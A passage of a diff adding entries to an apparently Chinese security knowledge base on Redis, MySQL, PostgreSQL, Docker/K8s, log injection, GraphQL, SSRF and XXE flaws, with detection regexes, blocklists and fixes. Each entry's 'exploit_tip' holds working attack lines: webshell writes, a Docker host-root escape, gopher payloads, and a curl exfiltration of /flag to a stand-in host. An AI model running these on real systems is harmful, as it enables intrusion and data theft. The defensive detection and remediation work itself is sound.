+  "description": "6379 无密码且 bind 0.0.0.0 时可直接 CONFIG SET dir/dbfilename 写 webshell、写 crontab、主从复制 RCE（RogueServer + MODULE LOAD）。",
+  "danger_functions": [
+   "redis",
+   "CONFIG SET",
+   "SLAVEOF"
+  ],
+  "code_patterns": [
+   "requirepass",
+   "bind 0.0.0.0",
+   "protected-mode no"
+  ],
+  "input_sources": [
+   "6379/tcp"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbredis-1",
+    "name": "Redis 无密码",
+    "type": "keyword",
+    "pattern": "protected-mode\\s+no|# requirepass",
+    "severity": "critical",
+    "priority": 1,
+    "description": "Redis 关闭保护模式或未设密码"
+   },
+   {
+    "rule_id": "kbredis-2",
+    "name": "公网监听",
+    "type": "regex",
+    "pattern": "^\\s*bind\\s+0\\.0\\.0\\.0",
+    "severity": "critical",
+    "priority": 1,
+    "description": "Redis 监听所有网卡"
+   },
+   {
+    "rule_id": "kbredis-3",
+    "name": "代码中 Redis 无认证",
+    "type": "regex",
+    "pattern": "(Redis|redis)\\s*\\(\\s*[^)]*\\)[\\s\\S]{0,60}(auth|password)\\s*=\\s*(None|null|'')",
+    "severity": "high",
+    "priority": 2,
+    "description": "客户端未配置认证"
+   }
+  ],
+  "fix_fast_method": "redis.conf: bind 127.0.0.1、requirepass <强口令>、protected-mode yes、rename-command CONFIG \"\"。",
+  "fix_secure_method": "只监听内网/本机；强口令 + ACL（Redis 6+）；禁用/重命名 CONFIG、MODULE、SLAVEOF、DEBUG；\n以低权限用户运行 Redis。",
+  "fix_code_example": "bind 127.0.0.1\nrequirepass S3cure-Rand0m-Pass\nprotected-mode yes\nrename-command CONFIG \"\"\nrename-command MODULE \"\"\nrename-command SLAVEOF \"\"",
+  "fix_code_language": "conf",
+  "fix_summary": "Redis 未授权等于可写文件 + 可加载模块，直接 RCE。",
+  "exploit_tip": "redis-cli -h t CONFIG SET dir /var/www/html\nCONFIG SET dbfilename shell.php\nSET x '<?php system($_GET[1]);?>'\nSAVE\n# 主从 RCE: python3 redis-rogue-server.py --rhost t --lhost me",
+  "waf_template": "if (6379 reachable externally): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "6379,CONFIG SET,SLAVEOF",
+  "framework_fix": "本机监听 + 强口令 + 禁用危险命令；防火墙阻断 6379。",
+  "bypass_methods": [
+   "SSRF gopher 打 6379",
+   "主从复制加载恶意模块",
+   "写 crontab / SSH key"
+  ],
+  "false_positive": "误报：内网只读 Redis 且已设密码时风险低。",
+  "tags": "redis,unauth,rce",
+  "references": [
+   "https://redis.io/docs/management/security/"
+  ]
+ },
+ {
+  "name": "MySQL 文件读写与 UDF 提权",
+  "category": "rce",
+  "language": "mixed",
+  "framework": "",
+  "severity": "critical",
+  "description": "拿到数据库高权限账号后可 SELECT ... INTO OUTFILE 写 webshell、LOAD_FILE 读任意文件、通过 UDF（lib_mysqludf_sys）执行命令，或读 /etc/shadow。",
+  "danger_functions": [
+   "INTO OUTFILE",
+   "LOAD_FILE",
+   "CREATE FUNCTION"
+  ],
+  "code_patterns": [
+   "INTO OUTFILE",
+   "LOAD_FILE(",
+   "CREATE FUNCTION"
+  ],
+  "input_sources": [
+   "数据库账号"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbmysql-1",
+    "name": "INTO OUTFILE 写文件",
+    "type": "keyword",
+    "pattern": "INTO\\s+(OUT|DUMP)FILE",
+    "severity": "critical",
+    "priority": 1,
+    "description": "SQL 写入服务器文件"
+   },
+   {
+    "rule_id": "kbmysql-2",
+    "name": "LOAD_FILE 读文件",
+    "type": "keyword",
+    "pattern": "LOAD_FILE\\s*\\(",
+    "severity": "high",
+    "priority": 1,
+    "description": "读取服务器任意文件"
+   },
+   {
+    "rule_id": "kbmysql-3",
+    "name": "UDF 创建函数",
+    "type": "keyword",
+    "pattern": "CREATE\\s+(AGGREGATE\\s+)?FUNCTION",
+    "severity": "critical",
+    "priority": 1,
+    "description": "创建 UDF 可执行系统命令"
+   }
+  ],
+  "fix_fast_method": "REVOKE FILE ON *.* FROM 'app'@'%'; 并设置 secure_file_priv=''。",
+  "fix_secure_method": "应用账号只授予业务库 DML 权限；secure_file_priv 设为固定目录或空（禁用）；\n禁用 FILE 权限，MySQL 以低权限用户运行。",
+  "fix_code_example": "REVOKE FILE ON *.* FROM 'app'@'%';\n-- my.cnf\nsecure_file_priv = \"\"\nlocal_infile = 0",
+  "fix_code_language": "sql",
+  "fix_summary": "FILE 权限 = 读写服务器文件，应用账号绝不能有。",
+  "exploit_tip": "SELECT '<?php system($_GET[1]);?>' INTO OUTFILE '/var/www/html/s.php';\nSELECT LOAD_FILE('/etc/passwd');\n# UDF\nSELECT ... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';",
+  "waf_template": "if (query matches 'INTO\\s+(OUT|DUMP)FILE|LOAD_FILE'): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "INTO OUTFILE,LOAD_FILE",
+  "framework_fix": "收回 FILE 权限；secure_file_priv 禁用；WAF 拦截 OUTFILE。",
+  "bypass_methods": [
+   "/**/OUTFILE",
+   "大小写",
+   "hex 编码路径",
+   "general_log 写文件"
+  ],
+  "false_positive": "误报：备份脚本使用 OUTFILE 到固定目录属预期。",
+  "tags": "mysql,file-write,udf,rce",
+  "references": [
+   "https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file"
+  ]
+ },
+ {
+  "name": "PostgreSQL COPY PROGRAM 命令执行",
+  "category": "rce",
+  "language": "mixed",
+  "framework": "",
+  "severity": "critical",
+  "description": "拥有超级用户或 pg_execute_server_program 角色时，COPY ... FROM PROGRAM 'id' 可直接执行系统命令；CVE-2019-9193 后该功能仍默认对超级用户开放。",
+  "danger_functions": [
+   "COPY ... PROGRAM",
+   "pg_read_file",
+   "lo_import"
+  ],
+  "code_patterns": [
+   "COPY",
+   "PROGRAM",
+   "pg_read_file"
+  ],
+  "input_sources": [
+   "数据库账号"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbpg-1",
+    "name": "COPY PROGRAM",
+    "type": "keyword",
+    "pattern": "COPY[\\s\\S]{0,120}(FROM|TO)\\s+PROGRAM",
+    "severity": "critical",
+    "priority": 1,
+    "description": "COPY PROGRAM 可执行命令"
+   },
+   {
+    "rule_id": "kbpg-2",
+    "name": "超级用户读取文件",
+    "type": "regex",
+    "pattern": "pg_(read|write)_(file|binary_file)\\s*\\(",
+    "severity": "high",
+    "priority": 1,
+    "description": "读写服务器文件函数"
+   },
+   {
+    "rule_id": "kbpg-3",
+    "name": "大对象导入",
+    "type": "keyword",
+    "pattern": "lo_(import|export)\\s*\\(",
+    "severity": "medium",
+    "priority": 2,
+    "description": "lo_import 可读服务器文件"
+   }
+  ],
+  "fix_fast_method": "REVOKE pg_execute_server_program FROM app_user; 应用账号不给 SUPERUSER。",
+  "fix_secure_method": "应用账号使用最小权限角色；撤销 pg_read_server_files / pg_write_server_files / pg_execute_server_program；\n禁用 lo_import/lo_export 给非管理角色。",
+  "fix_code_example": "REVOKE ALL ON FUNCTION pg_read_file(text) FROM PUBLIC;\nREVOKE pg_execute_server_program FROM app_user;\nCREATE ROLE app_user LOGIN PASSWORD '***' NOSUPERUSER;",
+  "fix_code_language": "sql",
+  "fix_summary": "COPY PROGRAM 等于数据库层命令执行，应用账号必须非超级用户。",
+  "exploit_tip": "COPY cmd FROM PROGRAM 'id';\nCOPY (SELECT '') TO PROGRAM 'curl http://me/$(cat /flag|base64)';\nSELECT pg_read_file('/flag');",
+  "waf_template": "if (query matches 'COPY.*PROGRAM|pg_read_file'): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "COPY PROGRAM,pg_read_file",
+  "framework_fix": "撤销角色权限；WAF 拦截 COPY PROGRAM。",
+  "bypass_methods": [
+   "COPY (SELECT ...) TO PROGRAM",
+   "大小写",
+   "通过 lo_import 读文件"
+  ],
+  "false_positive": "误报：DBA 运维使用 COPY PROGRAM 属预期，需区分账号。",
+  "tags": "postgresql,copy,rce",
+  "references": [
+   "https://www.postgresql.org/docs/current/sql-copy.html"
+  ]
+ },
+ {
+  "name": "MongoDB / Docker / K8s API 未授权",
+  "category": "auth-bypass",
+  "language": "mixed",
+  "framework": "",
+  "severity": "critical",
+  "description": "MongoDB 27017 无认证可拖库；Docker 2375 未授权可挂载宿主根目录逃逸；K8s 6443/10250 匿名访问可创建特权 Pod 拿节点权限。",
+  "danger_functions": [
+   "mongod",
+   "docker -H",
+   "kubelet"
+  ],
+  "code_patterns": [
+   "27017",
+   "2375",
+   "10250",
+   "--auth"
+  ],
+  "input_sources": [
+   "27017/tcp",
+   "2375/tcp",
+   "6443/tcp"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbmongo-1",
+    "name": "MongoDB 无认证",
+    "type": "keyword",
+    "pattern": "mongod\\s+(--dbpath|--bind_ip)",
+    "severity": "high",
+    "priority": 1,
+    "description": "mongod 启动未启用 --auth"
+   },
+   {
+    "rule_id": "kbmongo-2",
+    "name": "Docker 端口暴露",
+    "type": "keyword",
+    "pattern": "2375|2376|-H\\s+tcp://0\\.0\\.0\\.0",
+    "severity": "critical",
+    "priority": 1,
+    "description": "Docker daemon 暴露 TCP"
+   },
+   {
+    "rule_id": "kbmongo-3",
+    "name": "K8s 匿名访问",
+    "type": "keyword",
+    "pattern": "anonymous-auth\\s*[:=]\\s*true|system:anonymous",
+    "severity": "high",
+    "priority": 2,
+    "description": "允许匿名访问 API"
+   }
+  ],
+  "fix_fast_method": "mongod --auth + bind_ip 127.0.0.1；Docker 只用 unix socket；K8s 关闭 anonymous-auth。",
+  "fix_secure_method": "MongoDB 启用认证与 RBAC；Docker 加 TLS 或只用 socket；\nK8s 关闭 --anonymous-auth，启用 NodeRestriction 与 PodSecurity。",
+  "fix_code_example": "# mongod.conf\nsecurity:\n  authorization: enabled\nnet:\n  bindIp: 127.0.0.1",
+  "fix_code_language": "yaml",
+  "fix_summary": "未授权的数据库/容器 API 等于直接拿数据或宿主权限。",
+  "exploit_tip": "mongo --host t:27017  # 无密码直接 show dbs\ndocker -H t:2375 run -v /:/host -it alpine chroot /host\ncurl -k https://t:10250/pods",
+  "waf_template": "if (port 27017/2375/10250 externally reachable): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "27017,2375,10250",
+  "framework_fix": "启用认证 + 只监听本机 + 防火墙阻断。",
+  "bypass_methods": [
+   "MongoDB 旧版无认证",
+   "Docker TLS 证书泄露",
+   "K8s token 泄露"
+  ],
+  "false_positive": "误报：内网隔离环境仍建议认证。",
+  "tags": "mongodb,docker,kubernetes,unauth",
+  "references": [
+   "https://www.mongodb.com/docs/manual/administration/security-checklist/"
+  ]
+ },
+ {
+  "name": "日志注入 / 日志伪造",
+  "category": "crlf",
+  "language": "mixed",
+  "framework": "",
+  "severity": "medium",
+  "description": "用户输入未经处理写入日志，可插入换行伪造日志条目、注入 ANSI 控制符、或写入 <?php 配合日志包含 RCE；也可污染 SIEM 告警。",
+  "danger_functions": [
+   "error_log",
+   "logger",
+   "console.log"
+  ],
+  "code_patterns": [
+   "error_log(",
+   "logger.",
+   "console.log("
+  ],
+  "input_sources": [
+   "User-Agent",
+   "Referer",
+   "请求参数"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kblog-1",
+    "name": "日志拼接用户输入",
+    "type": "regex",
+    "pattern": "(error_log|logger\\.\\w+|console\\.log|log\\.\\w+)\\s*\\([^)]*(\\\\\\$_(GET|POST|SERVER)|req\\.(headers|query))",
+    "severity": "medium",
+    "priority": 2,
+    "description": "日志内容直接拼接用户输入"
+   },
+   {
+    "rule_id": "kblog-2",
+    "name": "日志文件可包含",
+    "type": "regex",
+    "pattern": "(include|require)[^;]{0,80}(\\\\.log|access_log|error_log)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "包含日志文件，可被日志投毒 RCE"
+   },
+   {
+    "rule_id": "kblog-3",
+    "name": "日志目录可写",
+    "type": "keyword",
+    "pattern": "/var/log/(nginx|apache2|httpd)",
+    "severity": "medium",
+    "priority": 3,
+    "description": "日志目录权限需确认"
+   }
+  ],
+  "fix_fast_method": "记录前做 json_encode 或 preg_replace('/[\\r\\n\\x00-\\x1f]/','',$v)。",
+  "fix_secure_method": "日志统一结构化（JSON）+ 字段转义；日志文件权限 640 且 web 用户不可写；\n禁止 include 日志文件；SIEM 侧做换行注入检测。",
+  "fix_code_example": "$line = json_encode(['t'=>date('c'),'ua'=>substr($ua,0,256)], JSON_UNESCAPED_SLASHES);\nerror_log($line.PHP_EOL, 3, '/var/log/app/app.log');",
+  "fix_code_language": "php",
+  "fix_summary": "日志内容必须转义换行，禁止包含日志文件。",
+  "exploit_tip": "curl -A 'x%0a2026-01-01 admin LOGIN SUCCESS' http://t/\ncurl -A '<?php system($_GET[1]);?>' http://t/ + LFI 包含 access.log",
+  "waf_template": "if (input contains '\\r' or '\\n'): sanitize before logging",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "%0a,access.log",
+  "framework_fix": "结构化日志 + 换行过滤；日志权限收紧；禁止 include 日志。",
+  "bypass_methods": [
+   "%0d%0a 伪造条目",
+   "ANSI 转义污染终端",
+   "超长行截断绕过"
+  ],
+  "false_positive": "误报：日志框架自动转义时安全。",
+  "tags": "log-injection,crlf",
+  "references": [
+   "https://owasp.org/www-community/attacks/Log_Injection"
+  ]
+ },
+ {
+  "name": "GraphQL 内省与批量滥用",
+  "category": "graphql",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "未关闭 introspection 可泄露全部 schema；别名批量查询可绕过限流爆破；深层嵌套导致 DoS；字段级授权缺失造成越权读。",
+  "danger_functions": [
+   "graphql",
+   "introspection",
+   "ApolloServer"
+  ],
+  "code_patterns": [
+   "__schema",
+   "introspection",
+   "graphql"
+  ],
+  "input_sources": [
+   "POST /graphql"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbgraphql-1",
+    "name": "内省开启",
+    "type": "keyword",
+    "pattern": "introspection\\s*:\\s*true|__schema",
+    "severity": "high",
+    "priority": 2,
+    "description": "允许内省查询"
+   },
+   {
+    "rule_id": "kbgraphql-2",
+    "name": "无查询深度限制",
+    "type": "keyword",
+    "pattern": "(depthLimit|maxDepth|queryComplexity)",
+    "severity": "medium",
+    "priority": 3,
+    "description": "缺少深度/复杂度限制"
+   },
+   {
+    "rule_id": "kbgraphql-3",
+    "name": "字段级鉴权缺失",
+    "type": "regex",
+    "pattern": "(Query|Mutation)\\s*:\\s*\\{[\\s\\S]{0,400}(password|token|secret)",
+    "severity": "high",
+    "priority": 3,
+    "description": "schema 暴露敏感字段需确认授权"
+   }
+  ],
+  "fix_fast_method": "生产环境关闭 introspection：ApolloServer({ introspection: false })。",
+  "fix_secure_method": "关闭 introspection + 限制查询深度/复杂度 + 别名数量限制；\n每个 resolver 做字段级授权；对批量查询按实际执行次数计费限流。",
+  "fix_code_example": "const server = new ApolloServer({\n  typeDefs, resolvers,\n  introspection: false,\n  validationRules: [depthLimit(5)],\n});",
+  "fix_code_language": "javascript",
+  "fix_summary": "GraphQL 需关内省 + 深度限制 + 字段级授权。",
+  "exploit_tip": "{__schema{types{name fields{name}}}}\n{a:login(u:\"admin\",p:\"1\"){t} b:login(u:\"admin\",p:\"2\"){t} ...}  # 别名批量爆破",
+  "waf_template": "if (body contains '__schema'): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "__schema,introspection",
+  "framework_fix": "关内省；深度/别名限制；字段级授权。",
+  "bypass_methods": [
+   "GET 请求发送 GraphQL",
+   "批量别名绕过限流",
+   "嵌套片段 DoS"
+  ],
+  "false_positive": "误报：开发环境开放内省属正常。",
+  "tags": "graphql,api,info-leak",
+  "references": [
+   "https://graphql.org/learn/security/"
+  ]
+ },
+ {
+  "name": "SSRF → 内网服务利用链（gopher 打 Redis/FPM/MySQL）",
+  "category": "ssrf",
+  "language": "mixed",
+  "framework": "",
+  "severity": "critical",
+  "description": "SSRF 不止读元数据：gopher:// 可构造任意 TCP 载荷打 Redis 写 shell、打 php-fpm 执行代码、打 MySQL 未授权、打内网 HTTP 管理面。",
+  "danger_functions": [
+   "gopher://",
+   "dict://",
+   "file://"
+  ],
+  "code_patterns": [
+   "gopher://",
+   "curl_exec",
+   "file_get_contents"
+  ],
+  "input_sources": [
+   "url",
+   "target",
+   "host"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbssrf-chain-1",
+    "name": "gopher 协议",
+    "type": "keyword",
+    "pattern": "gopher://",
+    "severity": "critical",
+    "priority": 1,
+    "description": "gopher 可构造任意 TCP 流量"
+   },
+   {
+    "rule_id": "kbssrf-chain-2",
+    "name": "dict 协议",
+    "type": "keyword",
+    "pattern": "dict://",
+    "severity": "high",
+    "priority": 2,
+    "description": "dict 可探测内网端口与服务"
+   },
+   {
+    "rule_id": "kbssrf-chain-3",
+    "name": "内网地址直连",
+    "type": "regex",
+    "pattern": "(127\\.0\\.0\\.1|169\\.254\\.169\\.254|10\\.\\d+\\.\\d+\\.\\d+|192\\.168\\.\\d+\\.\\d+):\\d+",
+    "severity": "high",
+    "priority": 2,
+    "description": "出现内网地址与端口"
+   }
+  ],
+  "fix_fast_method": "协议白名单 http/https，禁止 gopher/dict/file；出网做目标白名单。",
+  "fix_secure_method": "统一出网代理 + 目标域名白名单；禁止跟随重定向；\n内网服务全部加认证（Redis/FPM/MySQL），纵深防御。",
+  "fix_code_example": "$u = parse_url($url);\nif (!in_array($u['scheme'] ?? '', ['http','https'], true)) { die('bad scheme'); }\nif (!in_array($u['host'] ?? '', $allowHosts, true)) { die('bad host'); }",
+  "fix_code_language": "php",
+  "fix_summary": "SSRF 的真正杀伤在 gopher 打内网，必须协议 + 目标双白名单。",
+  "exploit_tip": "# Redis 写 shell\n?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...\n# FPM 执行\n?url=gopher://127.0.0.1:9000/_%01%01%00%01...",
+  "waf_template": "if (param matches '^(gopher|dict|file|ftp)://'): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "gopher://,dict://,169.254",
+  "framework_fix": "协议白名单；内网服务加认证；WAF 拦截 gopher://。",
+  "bypass_methods": [
+   "gopher 大写",
+   "gopher:// 双重编码",
+   "302 跳转到 gopher",
+   "通过 DNS 解析到内网"
+  ],
+  "false_positive": "误报：URL 为常量或域名白名单内安全。",
+  "tags": "ssrf,gopher,redis,php-fpm",
+  "references": [
+   "https://github.com/tarunkant/Gopherus"
+  ]
+ },
+ {
+  "name": "XXE 外部实体注入（含 OOB 外带）",
+  "category": "xxe",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "XML 解析未禁用外部实体时，可用 <!ENTITY xxe SYSTEM \"file:///flag\"> 读文件，或用参数实体把数据外带到攻击者服务器（盲 XXE）。",
+  "danger_functions": [
+   "libxml_disable_entity_loader",
+   "DocumentBuilder",
+   "XMLReader"
+  ],
+  "code_patterns": [
+   "DocumentBuilderFactory",
+   "simplexml_load_string",
+   "libxml_disable_entity_loader"
+  ],
+  "input_sources": [
+   "XML body",
+   "SOAP",
+   "SVG",
+   "docx/xlsx"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbxxe-1",
+    "name": "XML 解析未禁用实体",
+    "type": "regex",
+    "pattern": "(simplexml_load_string|DOMDocument|xml_parse|DocumentBuilderFactory|XMLReader)[\\s\\S]{0,120}(load|parse|newInstance)",
+    "severity": "medium",
+    "priority": 2,
+    "description": "XML 解析需确认已禁用外部实体"
+   },
+   {
+    "rule_id": "kbxxe-2",
+    "name": "DOCTYPE 出现",
+    "type": "keyword",
+    "pattern": "<!DOCTYPE[^>]{0,80}(SYSTEM|PUBLIC)",
+    "severity": "high",
+    "priority": 1,
+    "description": "XML 含外部 DTD 引用"
+   },
+   {
+    "rule_id": "kbxxe-3",
+    "name": "参数实体外带",
+    "type": "keyword",
+    "pattern": "%\\s*\\w+\\s+SYSTEM\\s+[\\\"'](http|ftp)://",
+    "severity": "critical",
+    "priority": 1,
+    "description": "参数实体指向外部地址，盲 XXE 外带"
+   }
+  ],
+  "fix_fast_method": "PHP: libxml_disable_entity_loader(true)（PHP<8）；Java: dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)。",
+  "fix_secure_method": "解析前禁用 DOCTYPE 与外部实体（Python 用 defusedxml）；\n如业务需要 DTD，用本地白名单 DTD 并禁用外部协议。",
+  "fix_code_example": "// PHP\nlibxml_use_internal_errors(true);\n$dom = new DOMDocument();\n$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT ^ LIBXML_NOENT);\n// Java\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);",
+  "fix_code_language": "php",
+  "fix_summary": "XML 必须禁用 DOCTYPE 与外部实体。",
+  "exploit_tip": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///flag\">]><r>&x;</r>\n# 盲 XXE\n<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://me/dtd\">%p;]>",
+  "waf_template": "if (body matches '<!DOCTYPE.*(SYSTEM|PUBLIC)'): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "DOCTYPE,SYSTEM,ENTITY",
+  "framework_fix": "禁用 DOCTYPE/外部实体；WAF 拦截 DOCTYPE。",
+  "bypass_methods": [
+   "UTF-16 编码绕过",
+   "参数实体分段拼接",
+   "通过 SVG/DOCX 上传触发"
+  ],
+  "false_positive": "误报：解析可信本地 XML 时风险低。",
+  "tags": "xxe,file-read,ssrf",
+  "references": [
+   "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+  ]
+ }
+]
